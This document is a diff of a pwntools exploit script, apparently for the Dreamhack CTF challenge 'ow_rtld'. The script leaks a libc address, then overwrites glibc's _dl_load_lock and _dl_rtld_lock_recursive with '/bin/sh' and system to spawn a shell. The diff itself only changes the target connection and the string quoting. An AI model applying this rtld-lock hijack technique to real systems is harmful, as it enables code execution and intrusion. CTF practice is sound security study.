@@ -1,11 +1,14 @@
 from pwn import *
 
-p = process('./ow_rtld')
+#p = process('./ow_rtld')
+p = remote('127.0.0.1', 7182)
 #p = remote('host3.dreamhack.games', 16788)
 libc = ELF('./libc-2.27.so')
 ld = ELF('./ld-2.27.so')
 
 # leak addr
+
+
 p.recvuntil(b'stdout: ')
 leak = int(p.recvline()[:-1], 16)
 libc_base = leak - libc.symbols['_IO_2_1_stdout_']
@@ -24,9 +27,9 @@ print('dl_load_lock :', hex(dl_load_lock))
 print('dl_rtld_lock_recursive :', hex(dl_recursive))
 print('system :', hex(system))
 
-p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b"> ", b"1")
 p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
-p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
+p.sendlineafter(b'data: ', str(u64(b'/bin/sh\x00')).encode())
 p.sendlineafter(b'> ', b'1')
 p.sendlineafter(b'addr: ', str(dl_recursive).encode())
 p.sendlineafter(b'data: ', str(system).encode())
